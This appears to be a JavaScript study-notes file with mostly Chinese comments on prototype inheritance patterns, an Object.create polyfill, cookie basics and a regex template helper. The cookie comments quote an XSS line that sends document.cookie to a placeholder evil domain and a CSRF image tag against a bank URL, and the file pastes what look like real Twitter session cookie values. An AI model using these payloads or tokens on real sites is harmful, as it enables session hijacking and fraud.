//寄生组合继承
//通过借用父类构造函数来继承属性，通过原型链来继承方法


//父类
function SuperType(name) {
    this.name = name;
    this.colors = [ 'red', 'blue', 'green' ];
}

SuperType.prototype.sayName = function() {
    console.log(this.name);
};

//子类
function SubType(name, age) {
    SuperType.call(this, name);//第二次调用父类构造函数，当调用子类构造函数时会借用父类构造函数
    //父类中的name和colors会在子类的实例中并覆盖子类原型中的同名属性
    this.age = age;
}

SubType.prototype = new SuperType(); //这里第一次调用父类的构造函数，但有个副作用,但把父类实例的属性写入子类
//的原型当中

//this is greate!
//inheritPrototype(SubType, SuperType);

SubType.prototype.constructor = SubType;
SubType.prototype.sayAge = function() {
    console.log(this.age);
};



function inheritPrototype(subType, superType) {
    var prototype = Object(superType.prototype);
    prototype.constructor = subType;
    subType.prototype = prototype;
}


//组合继承 就是上面的写法就是组合继承

SubType.prototype = new SuperType();
SubType.prototype.constructor = SubType;

//原型继承 Object.create()

function object(o) {
    function F() {}
    F.prototype = o;//有浅拷贝的问题
    return new F();
}

//Object.create polyfill
if (typeof Object.create !== "function") {
    Object.create = function (proto, propertiesObject) {
        if (typeof proto !== 'object' && typeof proto !== 'function') {
            throw new TypeError('Object prototype may only be an Object: ' + proto);
        } else if (proto === null) {
            throw new Error("This browser's implementation of Object.create is a shim and doesn't support 'null' as the first argument.");
        }

        if (typeof propertiesObject != 'undefined') {
            throw new Error("This browser's implementation of Object.create is a shim and doesn't support a second argument.");
        }
        
        function F() {}
        F.prototype = proto;
        
        return new F();
    };
}

//寄生式继承

function createAnother(original) {
    var clone = object(original);
    clone.sayHi = function() { //增强对象
        console.log('hi');
    };
    return clone;
}


//futu
function P(a, b) {
	this.a = a || 0;
	this.b = b || 0;
	this.sum = function() {
		return this.a + this.b;
	};
}

function M(a, b, c) {
	P.call(this, a, b);
	this.c = c || 0;
	this.sum = function() {
		return this.a + this.b + this.c;
	};
}

M.prototype = Object.create(P.prototype);

var m = new M(1,2,3);

console.log(m.sum());

//多继承 Object.assign
  // Shape - superclass
function Shape() {
    this.x = 0;
    this.y = 0;
  }
  
  // superclass method
  Shape.prototype.move = function(x, y) {
    this.x += x;
    this.y += y;
    console.info('Shape moved.');
  };
  
  // Rectangle - subclass
  function Rectangle() {
    Shape.call(this); // call super constructor.
  }
  
  // subclass extends superclass
  Rectangle.prototype = Object.create(Shape.prototype);
  Rectangle.prototype.constructor = Rectangle;
  
  var rect = new Rectangle();
  
  console.log('Is rect an instance of Rectangle?',
    rect instanceof Rectangle); // true
  console.log('Is rect an instance of Shape?',
    rect instanceof Shape); // true
  rect.move(1, 1); // Outputs, 'Shape moved.'

  function MyClass() {
    SuperClass.call(this);
    OtherSuperClass.call(this);
  }
  
  // inherit one class
  MyClass.prototype = Object.create(SuperClass.prototype);
  // mixin another
  Object.assign(MyClass.prototype, OtherSuperClass.prototype);
  // re-assign constructor
  MyClass.prototype.constructor = MyClass;
  
  MyClass.prototype.myMethod = function() {
    // do a thing
  };

//js引用类型 object array function
//内置引用类型 Date RegExp

// typeof [] // "object"

//cookie api
/*HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能

Cookie主要用于以下三个方面：
会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
个性化设置（如用户自定义设置、主题等）
浏览器行为跟踪（如跟踪分析用户行为等）

由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）
server: Set-Cookie: <cookie名>=<cookie值>
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
日期中客户端的
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
为避免跨域脚本 (XSS) 攻击，通过JavaScript的 Document.cookie API无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记

Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL

(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
csrf:
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">

*/

//清除cookie

//cookie "lang=zh-cn; moments_profile_moments_nav_tooltip_self=true; moments_profile_moments_nav_tooltip_other=true; __utma=43838368.2009606524.1487251058.1500815355.1500815355.1; __utmc=43838368; remember_checked_on=1; _ga=GA1.2.2009606524.1487251058; tfw_exp=0; personalization_id="v1_w5C9YfdgKl4thHRw+DFxXg=="; guest_id=v1%3A152276739874980286; ads_prefs="HBERAAA="; twid="u=780025556687425536"; _gid=GA1.2.978861345.1523675808; ct0=08a88ebb2917da9a217838333543d06a"
function deleteAllCookies() {
    var cookies = document.cookie.split(";");

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
}
//replace方法，模板引擎
var reg = /\{(\d)\}/g;

function format() {
	var arg = arguments;
	return '<h1>{0}</h1> <h2>{1}</h2> <h3>{2}</h3>'.replace(reg, function(a, b) {
        //a是匹配到的,b是第一个括号里面的内容
		console.log('a:', a, 'b: ',b)
		return arg[b] || 'default';
	})
}

console.log(format('aa', 'bb', 'cc'));


